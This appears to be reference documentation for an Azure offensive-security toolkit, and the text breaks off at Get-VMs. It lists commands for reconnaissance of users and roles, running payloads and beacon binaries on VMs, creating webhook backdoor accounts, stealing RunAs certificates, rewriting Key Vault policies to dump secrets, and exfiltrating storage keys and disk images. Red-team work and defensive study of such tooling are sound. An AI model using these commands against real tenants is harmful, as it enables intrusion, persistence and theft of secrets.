
Functions
=========

**Information Gathering**
^^^^^^^^^^^^^^^^^^^^^

**Get-Targets**
---------------

**Synopsis**


Compares your role to your scope to determine what you have access to
and what kind of access it is (Read/write/execute).

**Syntax**

::

   Get-Targets

**Description**


Looks at the current signed-in user’s roles, then looks at the role
definitions and scope of that role. Role definitions are then compared
to the scope of the role to determine which resources under that scope
the role definitions are actionable against.

**Examples**

::

   Get-Targets

**Required Modules**


Azure CLI

**Parameters**


None

**Output**


List of resources with what type of access the current user has access
to.

**Get-CurrentUser**


.. _**Synopsis**-1:

**Synopsis**


Returns the current logged in user name and any owned objects

.. _**Syntax**-1:

****Syntax****


::

   Get-CurrentUser

.. _**Description**-1:

**Description**


Looks at the current logged in username and compares that to the role
assignment list to determine what objects/resources the user has
ownership over.

.. _**Examples**-1:

**Examples**



::

   Get-CurrentUser


::

   Get-CurrentUser -All

.. _required-modules-1:

**Required Modules**


Azure CLI

.. _**Parameters**-1:

**Parameters** 


-All

Grabs all details

.. _**Output**-1:

**Output**


Current username and owned objects by that user

**Get-AllUsers**


.. _**Synopsis**-2:

**Synopsis**


List all Azure users in the tenant

.. _****Syntax****-2:

****Syntax****



::

  Get-AllUsers 

.. _**Description**-2:

**Description**


Lists all users in the tenant including their email, object type,
distinguished name, Principal name, and usertype.

.. _**Examples**-2:

**Examples**



::

   Get-AllUsers 


::

  Get-AllUsers -OutFile users.csv


::

  Get-AllUsers -OutFile users.txt

.. _required-modules-2:

**Required Modules**


Azure CLI

.. _**Parameters**-2:

**Parameters** 


-Outfile

Specifies the **Output** of the data.

.. _**Output**-2:

**Output**


List of all users in AAD, optionally in a file.

**Get-AADRoleMembers**

.. _**Synopsis**-3:

**Synopsis**


Lists the active roles in Azure AD and what users are part of the role.

.. _****Syntax****-3:

****Syntax****



::

  Get-AADRoleMembers

.. _**Description**-3:

**Description**


Gathers the AAD role members. This is different than Azure RBAC roles.

.. _**Examples**-3:

**Examples**



::

   Get-AADRoleMembers

.. _required-modules-3:

**Required Modules**


Azure CLI

AzureAD PowerShell

.. _**Parameters**-3:

**Parameters**


None

.. _**Output**-3:

**Output**


List of AAD Role members

**Get-User**


.. _**Synopsis**-4:

**Synopsis**


Gathers info on a specific user

.. _****Syntax****-4:

****Syntax****



::

  Get-User -User Test@domain.com 

.. _**Description**-4:

**Description**


Gathers the UPN, Object ID, On-premise distinguished name, and if the
account is enabled. Also lists the roles the user has in Azure RBAC.

.. _**Examples**-4:

**Examples**



::

  Get-User -User Test@domain.com%60

.. _required-modules-4:

**Required Modules**


Azure CLI

.. _**Parameters**-4:

**Parameters**


-User

User Principal Name

.. _**Output**-4:

**Output**


Details of user

**Get-AllGroups**
^

.. _**Synopsis**-5:

**Synopsis**


Gathers all the groups in the tenant

.. _****Syntax****-5:

****Syntax****



::

  Get-AllGroups

.. _**Description**-5:

**Description**


Gathers all the groups in the tenant 


.. _**Examples**-5:

**Examples**



::

  Get-AllGroups


::

  Get-AllGroups -OutFile users.csv


::

  Get-AllGroups -OutFile users.txt 

.. _**Parameters**-5:

**Parameters** 


-OutFile

**Output** file

.. _**Output**-5:

**Output**


List of groups in AAD, optionally in the format of a file.

**Get-Resources**
^

.. _**Synopsis**-6:

**Synopsis**


Lists all resources

.. _****Syntax****-6:

****Syntax****



::

  Get-Resources

.. _**Description**-6:

**Description**


Lists all the resources in the subscription that the user has access to.

.. _**Examples**-6:

**Examples**



::

  Get-Resources

.. _**Parameters**-6:

**Parameters**


None

.. _required-modules-5:

**Required Modules**


Azure CLI

.. _**Output**-6:

**Output**


List of resources the user can see

**Get-Apps**


.. _**Synopsis**-7:

**Synopsis**


Returns all applications and their Ids

.. _****Syntax****-7:

****Syntax****



::

  Get-Apps

.. _**Description**-7:

**Description**


Returns all the applications in Azure AD and their IDs

.. _**Examples**-7:

**Examples**



::

  Get-Apps

.. _**Parameters**-7:

**Parameters** 


None

.. _required-modules-6:

**Required Modules**


Azure CLI

.. _**Output**-7:

**Output**


Applications in AAD

**Get-GroupMembers**
---------------~~~~~

.. _**Synopsis**-8:

**Synopsis**


Gets all the members of a specific group. Group does NOT mean role.

.. _****Syntax****-8:

****Syntax****



::

  Get-GroupMembers -Group 'SQL Users' 

.. _**Description**-8:

**Description**


Will get the members of a specific AAD group.

.. _**Examples**-8:

**Examples**



::

  Get-GroupMembers -Group 'SQL Users' 


::

  Get-GroupMembers -Group 'SQL Users' -OutFile users.csv

.. _**Parameters**-8:

**Parameters**


-Group

Group name

-OutFile

**Output** file

.. _required-modules-7:

**Required Modules**


Azure CLI

.. _**Output**-8:

**Output**


Group members of the specified group, optionally to a file.

**Get-AllGroupMembers**
---------------~~~~~~~~

.. _**Synopsis**-9:

**Synopsis**


Gathers all the group members of all the groups.

.. _****Syntax****-9:

****Syntax****



::

  Get-AllGroupMembers

.. _**Description**-9:

**Description**


Goes through each group in AAD and lists the members.

.. _**Examples**-9:

**Examples**



::

  Get-AllGroupMembers -OutFile members.txt 


::

  Get-AllGroupMembers

.. _**Parameters**-9:

**Parameters** 


-OutFile

**Output** filename/type

.. _required-modules-8:

**Required Modules**


Azure CLI

.. _**Output**-9:

**Output**


List of group members for each group in AAD.

**Get-AllRoleMembers**
---------------~~~~~~~

.. _**Synopsis**-10:

**Synopsis**


Gets all the members of all roles. Roles does not mean groups.

.. _****Syntax****-10:

****Syntax****



::

  Get-AllRoleMembers

.. _**Description**-10:

**Description**


.. _**Examples**-10:

**Examples**


.. _get-allrolemembers-1:


::

  Get-AllRoleMembers



::

  Get-AllRoleMembers -OutFile users.csv
^


::

  Get-AllRoleMembers -OutFile users.txt
^

.. _**Parameters**-10:

**Parameters** 


-OutFile

**Output** filename/type

.. _required-modules-9:

**Required Modules**


Azure CLI

.. _**Output**-10:

**Output**


All members of all roles

**Get-RoleMembers** 
---------------~~~~

.. _**Synopsis**-11:

**Synopsis**


Gets the members of a role.

.. _****Syntax****-11:

****Syntax****



::

  Get-RoleMembers -Role [Role name]

.. _**Description**-11:

**Description**


Gets the members of a role. Capitalization matters (i.e. reader vs
Reader <---correct)

.. _**Examples**-11:

**Examples**



::

  Get-RoleMembers -Role Reader

.. _**Parameters**-11:

**Parameters**


-Role

Name of role. Needs to be properly capitalized

.. _required-modules-10:

**Required Modules**


Azure CLI

.. _**Output**-11:

**Output**


Members of specified role.

**Get-Roles**


.. _**Synopsis**-12:

**Synopsis**


Lists the roles of a specific user.

.. _****Syntax****-12:

****Syntax****



::

  Get-Roles -User [UPN] 

.. _**Description**-12:

**Description**


Lists the Azure RBAC roles of a specific user based on their UPN.

.. _**Examples**-12:

**Examples**



::

  Get-Roles -User john@contoso.com

.. _**Parameters**-12:

**Parameters** 


-User

UPN of the user

.. _required-modules-11:

**Required Modules**


Azure CLI

.. _**Output**-12:

**Output**


Roles of the specified user

**Get-ServicePrincipals**
^

.. _**Synopsis**-13:

**Synopsis**


Returns all service principals

.. _****Syntax****-13:

****Syntax****



::

  Get-ServicePrincipals

.. _**Description**-13:

**Description**


Returns all service principals in AAD.

.. _**Examples**-13:

**Examples**



::

  Get-ServicePrincipals

.. _**Parameters**-13:

**Parameters**


None

.. _required-modules-12:

**Required Modules**


Azure CLI

.. _**Output**-13:

**Output**


List of SPs in AAD

**Get-ServicePrincipal**


.. _**Synopsis**-14:

**Synopsis**


Returns all info on a service principal

.. _****Syntax****-14:

****Syntax****



::

  Get-ServicePrincipal –id [SP ID]

.. _**Description**-14:

**Description**


Returns all details on a service principal via the SP’s ID.

.. _**Examples**-14:

**Examples**



::

  Get-ServicePrincipal -id fdb54b57-a416-4115-8b21-81c73d2c2deb

.. _**Parameters**-14:

**Parameters** 


-id

ID of the Service Principal

.. _required-modules-13:

**Required Modules**


Azure CLI

.. _**Output**-14:

**Output**


Details of specified service principal

**Get-AppPermissions**


.. _**Synopsis**-15:

**Synopsis**


Returns the permissions of an app

.. _****Syntax****-15:

****Syntax****



::

   Get-AppPermissions -Id [App ID]

.. _**Description**-15:

**Description**


Gathers the permissions an application has.

.. _**Examples**-15:

**Examples**



::

  Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb

.. _**Parameters**-15:

**Parameters**


-Id

ID of the Application

.. _required-modules-14:

**Required Modules**


Azure CLI

.. _**Output**-15:

**Output**


Application’s permissions

**Get-WebApps**
---------------

.. _**Synopsis**-16:

**Synopsis**


Gets running webapps

.. _****Syntax****-16:

****Syntax****



::

  Get-WebApps

.. _**Description**-16:

**Description**


Gathers the names of the running web applications

.. _**Examples**-16:

**Examples**



::

  Get-WebApps

.. _**Parameters**-16:

**Parameters**


None

.. _required-modules-15:

**Required Modules**


Azure CLI

.. _**Output**-16:

**Output**


Web application names

**Get-WebAppDetails** 
---------------~~~~~~

.. _**Synopsis**-17:

**Synopsis**


Gets running webapps details

Permissions


.. _****Syntax****-17:

****Syntax****



::

  Get-WebAppDetails -Name [WebAppName]

.. _**Description**-17:

**Description**


Gets the details of a web application

.. _**Examples**-17:

**Examples**



::

  Get-WebAppDetails -Name AppName

.. _**Parameters**-17:

**Parameters** 


-name

Name of web application

.. _required-modules-16:

**Required Modules**


Azure CLI

.. _**Output**-17:

**Output**


Details of web application

**Get-RunAsCertificate** 
---------------~~~~~~~~~

.. _**Synopsis**-18:

**Synopsis**


Will gather a RunAs accounts certificate which can then be used to login
as that account.

.. _permissions-1:

Permissions


.. _****Syntax****-18:

****Syntax****



::

  Get-RunAsCertificate -ResourceGroup [RG Name] -AutomationAccount [AA
Name]

.. _**Description**-18:

**Description**


Will gather a RunAs accounts certificate which can then be used to login
as that account. By default, RunAs accounts are contributors over the
subscription. This function does take a minute to run as it creates a
runbook, uploads it, runs it, then parses the **Output** to gather the
certificate.

.. _**Examples**-18:

**Examples**



::

  Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount
TestAccount

.. _**Parameters**-18:

**Parameters**


-ResourceGroup

Name of the resource group the Automation Account is located in.

-AutomationAccount

The name of the Automation Account.

.. _required-modules-17:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-18:

**Output**


Connection string for the RunAs account

**Get-AADRole** 
---------------

.. _**Synopsis**-19:

**Synopsis**


Finds a specified AAD Role and its definitions


.. _permissions-2:

Permissions


.. _****Syntax****-19:

****Syntax****



::

   Get-AADRole -Role [Role]

.. _**Description**-19:

**Description**


Finds a specified AAD Role and its definitions. Role must be properly capitalized. If role has a space in the name, use single quotes around the name.


.. _**Examples**-19:

**Examples**



::

  Get-AADRole -Role 'Company Administrator'

.. _**Parameters**-19:

**Parameters**


None

.. _required-modules-18:

**Required Modules**


Azure CLI

AzureAD PowerShell

.. _**Output**-19:

**Output**


Active roles

**Get-AADRoleMembers** 
---------------~~~~~~~

.. _**Synopsis**-20:

**Synopsis**


Lists the active roles in Azure AD and what users are part of the role.

.. _permissions-3:

Permissions


.. _****Syntax****-20:

****Syntax****



::

  Get-AADRoleMembers

.. _**Description**-20:

**Description**


Lists the active roles in Azure AD and what users are part of the role.

.. _**Examples**-20:

**Examples**



::

  Get-AADRoleMembers

.. _**Parameters**-20:

**Parameters**


None

.. _required-modules-19:

**Required Modules**


Azure CLI

.. _**Output**-20:

**Output**


Active roles

Operational
-----------

**Execute-Command**


.. _**Synopsis**-21:

**Synopsis**


Will run a command or script on a specified VM

.. _permissions-4:

Permissions


.. _****Syntax****-21:

****Syntax****



::

  Execute-Command -OS [OS] -ResourceGroup [RG Name] -VM [VM Name]
-Command [Command]

.. _**Description**-21:

**Description**


Executes a command on a virtual machine in Azure using 
::

  az vm run-command invoke

.. _**Examples**-21:

**Examples**



::

  Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10
-Command whoami

.. _**Parameters**-21:

**Parameters** 


-OS

Operating system, options are 'Linux' or 'Windows'

-ResourceGroup

Resource group name the VM is located in

-VM

Name of the virtual machine to execute the command on

-Command

The command to be executed

.. _required-modules-20:

**Required Modules**


Azure CLI

.. _**Output**-21:

**Output**


**Output** of command being run or a failure message if failed

**Execute-MSBuild** 
---------------~~~~

.. _**Synopsis**-22:

**Synopsis**


Will run a supplied MSBuild payload on a specified VM. By default, Azure
VMs have .NET 4.0 installed. Requires Contributor Role. Will run as
SYSTEM.

.. _permissions-5:

Permissions


.. _****Syntax****-22:

****Syntax****



::

  Execute-MSBuild -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload/onyourmachine.xml]

.. _**Description**-22:

**Description**


Uploads an MSBuild payload as a .ps1 script to the target VM then calls
msbuild.exe with 

::

  az run-command invoke.

.. _**Examples**-22:

**Examples**



::

  Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbuild.xml

.. _**Parameters**-22:

**Parameters** 


-ResourceGroup


Resource group name the VM is located in


-VM


Name of the virtual machine to execute the command on


-File


Location of build.xml file

.. _required-modules-21:

**Required Modules**


Azure CLI

.. _**Output**-22:

**Output**


Success message of msbuild starting the build if successful, error
message if upload failed.

**Execute-Program** 
---------------~~~~

.. _**Synopsis**-23:

**Synopsis**


Will run a given binary on a specified VM

.. _permissions-6:

Permissions


.. _****Syntax****-23:

****Syntax****



::

  Execute-Program -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload.exe]

.. _**Description**-23:

**Description**


Takes a supplied binary, base64 encodes the byte stream to a file,
uploads that file to the VM, then runs a command via
 
::

  az run-command invoke

to decode the base64 byte stream to a .exe file, then executes
the binary.

.. _**Examples**-23:

**Examples**



::
	Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File
C:tempbeacon.exe

.. _**Parameters**-23:

**Parameters** 


-ResourceGroup

Resource group name the VM is located in

-VM

Name of the virtual machine to execute the command on

-File

Location of executable binary

.. _required-modules-22:

**Required Modules**


Azure CLI

.. _**Output**-23:

**Output**


“Provisioning Succeeded” **Output**. Because it’s a binary being executed,
there will be no native **Output** unless the binary is meant to return data
to stdout.

**Create-Backdoor** 
---------------~~~~

.. _**Synopsis**-24:

**Synopsis**


Creates a backdoor in Azure via Runbooks

.. _permissions-7:

Permissions


.. _****Syntax****-24:

****Syntax****



::

  Create-Backdoor -Username [Username] -Password [Password] -AutomationAccount [AA name] -ResourceGroup [RG Name] -NewUsername [New UN] -NewPassword [New Password]

.. _**Description**-24:

**Description**


Will create a Runbook that creates an Azure account and generates a
Webhook to that Runbook so it can be executed if you lose access to
Azure. Also gives the ability to upload your own .ps1 file as a Runbook
(Customization)

This requires an account that is part of the 'Administrators' Role
(Needed to make a user)

.. _**Examples**-24:

**Examples**



::

  Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd


.. _**Parameters**-24:

**Parameters** 


-Username

Username you used to login to Azure with, that has permissions to create
a Runbook and user

-Password

Password to that account

-AutomationAccount

Azure Automation Account name

-ResourceGroup

Resource Group name

-NewUsername

Username you want to create

-NewPassword

Password for that new account

.. _required-modules-23:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-24:

**Output**


URI if successful, permissions error if failure

**Execute-Backdoor** 
---------------~~~~~

.. _**Synopsis**-25:

**Synopsis**


This runs the backdoor URI that is created with "Create-Backdoor”

.. _permissions-8:

Permissions


.. _****Syntax****-25:

****Syntax****



::

  Execute-Backdoor -URI [URI]

.. _**Description**-25:

**Description**


Executes the URI created by Create-Backdoor

.. _**Examples**-25:

**Examples**



::

  Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d

.. _**Parameters**-25:

**Parameters** 


-URI

The URI generated by Create-Backdoor

.. _required-modules-24:

**Required Modules**


| Azure CLI
| Azure PowerShell

.. _**Output**-25:

**Output**


Webhook successfully executed

**Execute-CommandRunbook** 
---------------~~~~~~~~~~~

.. _**Synopsis**-26:

**Synopsis**


Will execute a supplied command or script from a Runbook if the Runbook
is configured with a "RunAs" account

.. _permissions-9:

Permissions


.. _****Syntax****-26:

****Syntax****



::

  Execute-CommandRunbook -AutomationAccount [AA Name] -ResourceGroup [RGName] -VM [VM Name] -Command [Command]

.. _**Description**-26:

**Description**


If an Automation Account is utilizing a ‘Runas’ account, this allows you
to run commands against a virtual machine if that RunAs account has the
correct permissions over the VM.

.. _**Examples**-26:

**Examples**



::

  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami


::

  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Script "C:temptest.ps1"

.. _**Parameters**-26:

**Parameters** 


-AutomationAccount

Automation Account name

-ResourceGroup

Resource Group name

-VM

VM name

-Command (optional)

Command to be run against the VM. Choose this or -Script if executing an
entire script

-Script (optional)

Run an entire script instead of just one command.

.. _required-modules-25:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-26:

**Output**


**Output** of command if successfully ran.

**Upload-StorageContent** 
---------------~~~~~~~~~~

.. _**Synopsis**-27:

**Synopsis**


Uploads a supplied file to a storage share.

.. _permissions-10:

Permissions


.. _****Syntax****-27:

****Syntax****



::

  Upload-StorageContent -StorageAccount [Storage Account name] -Share [Storage share name] -File [File name to upload]

.. _**Description**-27:

**Description**


Uploads a supplied file to a storage container located in a storage
account

.. _**Examples**-27:

**Examples**



::

  Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt

.. _**Parameters**-27:

**Parameters** 


-StorageAccount

Name of Storage account. Try Get-StorageAccounts for a list.

-File

File to upload

-Share

Share name to upload to

.. _required-modules-26:

**Required Modules**


Azure CLI

Azure Powershell

.. _**Output**-27:

**Output**


Success message

**Stop-VM** 
~~~~~~~~~~~

.. _**Synopsis**-28:

**Synopsis**


Stops a Virtual Machine

.. _permissions-11:

Permissions


.. _****Syntax****-28:

****Syntax****



::

   Stop-VM -VM [VM name] -ResourceGroup [RG] 

.. _**Description**-28:

**Description**


Stops a VM

.. _**Examples**-28:

**Examples**



::

   Stop-VM -VM Example2016R2 -ResourceGroup Test_RG

.. _**Parameters**-28:

**Parameters** 


-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-27:

**Required Modules**


Azure CLI

.. _**Output**-28:

**Output**


VM successfully stops

Start-VM 
~~~~~~~~

****Synopsis****

Starts a Virtual Machine

**Permissions**

******Syntax******


::

   Start-VM -VM [VM name] -ResourceGroup [RG] 

****Description****

Starts a VM

****Examples****


::

   Start-VM -VM Example2016R2 -ResourceGroup Test_RG

****Parameters****

-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-28:

**Required Modules**


Azure CLI

****Output****

VM successfully starts

.. _section-1:

Restart-VM 
~~~~~~~~~~

****Synopsis****

Restarts a Virtual Machine

**Permissions**

******Syntax******


::

   Restart-VM -VM [VM name] -ResourceGroup [RG] 

****Description****

Restarts a VM

****Examples****


::

   Restart-VM -VM Example2016R2 -ResourceGroup Test_RG

****Parameters****

-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-29:

**Required Modules**


Azure CLI

****Output****

VM successfully restarts

**Start-Runbook** 
---------------~~

.. _**Synopsis**-29:

**Synopsis**


Starts a Runbook

.. _permissions-12:

Permissions


.. _****Syntax****-29:

****Syntax****



::

   Start-Runbook -Account [Automation Account name] -ResourceGroup [Resource Group name] -Runbook [Runbook name] 

.. _**Description**-29:

**Description**


Starts a specified Runbook

.. _**Examples**-29:

**Examples**



::

   Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook 

.. _**Parameters**-29:

**Parameters** 


-Account

Name of Automation Account the Runbook is in

-ResourceGroup

Resource group it's located in

-Runbook

Name of runbook

.. _required-modules-30:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-29:

**Output**


Runbook **Output**

**Set-Role** 
~~~~~~~~~~~~

.. _**Synopsis**-30:

**Synopsis**


Assigns a user a role for a specific resource or subscription

.. _permissions-13:

Permissions


.. _****Syntax****-30:

****Syntax****



::

  Set-Role -Role Owner -User [UPN] -Resource [Resource name]

.. _**Description**-30:

**Description**


Sets a role over a resource or subscription.

.. _**Examples**-30:

**Examples**



::

  Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM


::

  Set-Role -Role Owner -User john@contoso.com -Subscription SubName

.. _**Parameters**-30:

**Parameters** 


-User

Name of user in format user@domain.com

-Role

Role name (must be properly capitalized)

-Resource

Name of Resource

-Subscription

Name of subscription

.. _required-modules-31:

**Required Modules**


Azure CLI

.. _**Output**-30:

**Output**


Role successfully applied

Remove-Role 
~~~~~~~~~~~

****Synopsis****

Removes a user from a role for a specific resource or subscription

**Permissions**

******Syntax******


::

  Set-Role -Role Owner -User [UPN] -Resource [Resource name]

****Description****

Removes a role over a resource or subscription.

****Examples****


::

  Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM


::

  Remove-Role -Role Owner -User john@contoso.com -Subscription SubName

****Parameters****

-User

Name of user in format user@domain.com

-Role

Role name (must be properly capitalized)

-Resource

Name of Resource

-Subscription

Name of subscription

.. _required-modules-32:

**Required Modules**


Azure CLI

****Output****

Role successfully Removed

**Set-Group** 
~~~~~~~~~~~~~

.. _**Synopsis**-31:

**Synopsis**


Adds a user to an Azure AD Group

.. _permissions-14:

Permissions


.. _****Syntax****-31:

****Syntax****



::

  Set-Group -User [UPN] -Group [Group name]

.. _**Description**-31:

**Description**


Adds a user to an AAD group. If the group name has spaces, put the group
name in single quotes.

.. _**Examples**-31:

**Examples**



::

  Set-Group -User john@contoso.com -Group 'SQL Users' 

.. _**Parameters**-31:

**Parameters** 


-User

UPN of the user

-Group

AAD Group name

.. _required-modules-33:

**Required Modules**


Azure CLI

.. _**Output**-31:

**Output**


User added to group

**Set-Password** 
---------------~

.. _**Synopsis**-32:

**Synopsis**


Sets a user's password

.. _permissions-15:

Permissions


.. _****Syntax****-32:

****Syntax****



::

  Set-Password -Username [UPN] -Password [new password]

.. _**Description**-32:

**Description**


Sets a user’s password. Requires AAD PS Module.

.. _**Examples**-32:

**Examples**



::

  Set-Password -Username john@contoso.com -Password newpassw0rd1

.. _**Parameters**-32:

**Parameters** 


-Password

New password for user

-Username

Name of user

.. _required-modules-34:

**Required Modules**


Azure CLI

AzureAD PowerShell

.. _**Output**-32:

**Output**


Password successfully set

Secret/Key/Certificate Gathering
^^^^^^^^^^^^^^^^^^^^^-----------

**Get-KeyVaults**
^

.. _**Synopsis**-33:

**Synopsis**


Lists the Key Vaults

.. _permissions-16:

Permissions


.. _****Syntax****-33:

****Syntax****



::

  Get-KeyVaults

.. _**Description**-33:

**Description**


Gathers the Keyvaults in the subscription

.. _**Examples**-33:

**Examples**



::

  Get-KeyVaults

.. _**Parameters**-33:

**Parameters** 


None

.. _required-modules-35:

**Required Modules**


Azure CLI

.. _**Output**-33:

**Output**


List of KeyVaults

**Get-KeyVaultContents** 
---------------~~~~~~~~~

.. _**Synopsis**-34:

**Synopsis**


Get the secrets from a specific Key Vault

.. _permissions-17:

Permissions


.. _****Syntax****-34:

****Syntax****



::

  Get-KeyVaultContents -Name [VaultName] 

.. _**Description**-34:

**Description**


Takes a supplied KeyVault name and edits the access policy to allow the
current user to view the vault. Once the secrets are displayed, it
re-edits the policy and removes your access.

.. _**Examples**-34:

**Examples**



::

  Get-KeyVaultContents -Name TestVault

.. _**Parameters**-34:

**Parameters** 


-Name

Vault name

.. _required-modules-36:

**Required Modules**


Azure CLI

.. _**Output**-34:

**Output**


KeyVault contents

**Get-AllKeyVaultContents** 
---------------~~~~~~~~~~~~

.. _**Synopsis**-35:

**Synopsis**


Gets ALL the secrets from all Key Vaults. If the logged in user cannot
access a key vault, it tries to edit the access policy to allow access.

.. _permissions-18:

Permissions


.. _****Syntax****-35:

****Syntax****



::

  Get-AllKeyVaultContents

.. _**Description**-35:

**Description**


Goes through each key vault and edits the access policy to allow the
user to view the contents, displays the contents, then re-edits the
policies to remove the user from the access policy.

.. _**Examples**-35:

**Examples**



::

  Get-AllKeyVaultContents

.. _**Parameters**-35:

**Parameters** 


None

.. _required-modules-37:

**Required Modules**


Azure CLI

.. _**Output**-35:

**Output**


Key vault content

Data Exfiltration
-----------------

**Get-StorageAccounts** 
---------------~~~~~~~~

.. _**Synopsis**-36:

**Synopsis**


Get a list of storage accounts and their blobs

.. _permissions-19:

Permissions


.. _****Syntax****-36:

****Syntax****



::

  Get-StorageAccounts

.. _**Description**-36:

**Description**


Gets a list of storage account blobs

.. _**Examples**-36:

**Examples**



::

  Get-StorageAccounts

.. _**Parameters**-36:

**Parameters** 


None

.. _required-modules-38:

**Required Modules**


Azure CLI

Azure Powershell

.. _**Output**-36:

**Output**


List of storage accounts

**Get-StorageAccountKeys** 
---------------~~~~~~~~~~~

.. _**Synopsis**-37:

**Synopsis**


Gets the account keys for a storage account

.. _permissions-20:

Permissions


.. _****Syntax****-37:

****Syntax****



::

  Get-StorageAccountKeys -ResourceGroup [Resource Group name] -Account
[StorageAccountName]

.. _**Description**-37:

**Description**


Gets the account keys for a storage account to be used to access the
storage account.

.. _**Examples**-37:

**Examples**



::

  Get-StorageAccountKeys -ResourceGroup MyGroup -Account
StorageAccountName -kerb 

.. _**Parameters**-37:

**Parameters** 


- ResourceGroup

Resource group the Storage account is located in

-Account

Storage account name

-kerb (optional, use if kerberos keys are suspected)

Also grab the “Kerberos keys”

.. _required-modules-39:

**Required Modules**


Azure CLI

Azure Powershell

.. _**Output**-37:

**Output**


List of keys in plain text

**Get-StorageContents** 
---------------~~~~~~~~

.. _**Synopsis**-38:

**Synopsis**


Gets the contents of a storage container or file share.

.. _permissions-21:

Permissions


.. _****Syntax****-38:

****Syntax****



::

  Get-StorageContents -StorageAccount [Storage account name]
-ResourceGroup [Resource group name] -File [File name]

.. _**Description**-38:

**Description**


Gets the contents of a storage container or file share. OAuth is not
support to access file shares via cmdlets, so you must have access to
the Storage Account's key.

.. _**Examples**-38:

**Examples**



::

   Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
-File secret.txt -NoDelete

.. _**Parameters**-38:

**Parameters** 


-ResourceGroup

Resource Group name

-StorageAccount

Name of Storage account. Try Get-StorageAccounts for a list.

-File

Gets the contents of a specified file. If file is in a path, include the
full path. Optional

-NoDelete

Does not delete the file after it's downloaded. Optional

.. _required-modules-40:

**Required Modules**


Azure CLI

Azure Powershell

.. _**Output**-38:

**Output**


File contents are displayed

**Get-Runbooks** 
---------------~

.. _**Synopsis**-39:

**Synopsis**


Lists all the run books in all Automation accounts under the
subscription

.. _permissions-22:

Permissions


.. _****Syntax****-39:

****Syntax****



::

  Get-Runbooks

.. _**Description**-39:

**Description**


Recursively goes through each Automation Account and lists the runbook
names, it’s state, the creation and modification time, and what AA it is
under.

.. _**Examples**-39:

**Examples**



::

  Get-Runbooks

.. _**Parameters**-39:

**Parameters** 


None

.. _required-modules-41:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-39:

**Output**


List of runbooks and their associated Automation Accounts

**Get-RunbookContent** 
---------------~~~~~~~

.. _**Synopsis**-40:

**Synopsis**


Gets a specific Runbook and displays its contents. Use -NoDelete to not
delete after reading

.. _permissions-23:

Permissions


.. _****Syntax****-40:

****Syntax****



::

  Get-RunbookContent -Account [AutomationAccountName] -ResourceGroup
[ResourceGroupName] -Runbook [Runbook name]

.. _**Description**-40:

**Description**


.. _**Examples**-40:

**Examples**



::

  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
TestGroup -Runbook TestBook


::

  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
TestGroup -Runbook TestBook -Slot "Published"


::

  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
TestGroup -Runbook TestBook -Slot "Draft"

.. _**Parameters**-40:

**Parameters** 


-Runbook

Name of Runbook

-Group

Resource group it's located in

-Account

Automation Account Name

-NoDelete

Do not delete after displaying contents

-Slot

Optional; use if differenciating between published or drafted Runbook

.. _required-modules-42:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-40:

**Output**


Runbook content

**Get-AvailableVMDisks** 
---------------~~~~~~~~~

.. _**Synopsis**-41:

**Synopsis**


Lists the VM disks available.

.. _permissions-24:

Permissions


.. _****Syntax****-41:

****Syntax****



::

  Get-AvailableVMDisks

.. _**Description**-41:

**Description**


Lists the VM disks available in the subscription

.. _**Examples**-41:

**Examples**



::

  Get-AvailableVMDisks

.. _**Parameters**-41:

**Parameters** 


None

.. _required-modules-43:

**Required Modules**


Azure CLI

.. _**Output**-41:

**Output**


List of VM Disks

**Get-VMDisk** 
~~~~~~~~~~~~~~

.. _**Synopsis**-42:

**Synopsis**


Generates a link to download a Virtual Machiche's disk. The link is only
available for an hour.

.. _permissions-25:

Permissions


.. _****Syntax****-42:

****Syntax****



::

   Get-VMDisk -DiskName [Disk name] -ResourceGroup [RG Name]

.. _**Description**-42:

**Description**


Generates a link to download a Virtual Machiche's disk. The link is only
available for an hour. Note that you’re downloading a VM Disk, so it’s
probably going to be many GBs in size. Hope you have fiber!

.. _**Examples**-42:

**Examples**



::

   Get-VMDisk -DiskName
AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup
TestGroup

.. _**Parameters**-42:

**Parameters** 


-ResourceGroup

Resource group name

-DiskName

Name of VM disk

.. _required-modules-44:

**Required Modules**


Azure CLI

.. _**Output**-42:

**Output**


Link to download the VM disk

**Get-VMs** 
~~~~~~~~~~~

.. _**Synopsis**-43:

**Synopsis**


Lists all virtual machines available, their disks, and their IPs.

.. _permissions-26:

Permissions


.. _****Syntax****-43:

****Syntax****



::

  Get-VMs

.. _**Description**-43:

**Description**


Lists all virtual machines available, their disks, and their IPs, as
well their running state

.. _**Examples**-43:

**Examples**



::

  Get-VMs

.. _**Parameters**-43:

